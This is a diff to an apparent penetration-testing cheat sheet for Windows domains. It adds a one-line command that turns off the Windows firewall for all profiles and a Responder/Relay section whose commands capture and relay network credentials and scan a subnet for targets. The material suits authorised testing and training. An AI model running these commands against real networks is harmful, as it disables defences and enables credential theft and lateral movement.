@@ -47,6 +47,8 @@ netsh firewall show config firewall config
 netsh advfirewall show currentprofile
 #### Firewall Config
 netsh advfirewall firewall show rule name=all
+#### Turn off Firewall
+netsh advfirewall set allprofiles state off
 #### List Computers In Current Domain
 net view
 #### List Users
@@ -237,3 +239,13 @@ $ldapsearch = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$searc
 Get-NetLoggedon -ComputerName foobar
 #### Find Logged On Sessions
 Get-NetSessions -ComputerName dc02
+
+
+## Responder/Relay
+#### Invoke MultiRelay (relays if an incoming connection is recieved)
+python MultiRelay.py -t 192.168.11.17 -u ALL
+#### Determine if target is vulnerable
+python RunFinger.py -i 192.168.0.0/24
+#### Start Responder
+python Responder.py -I eth0
+
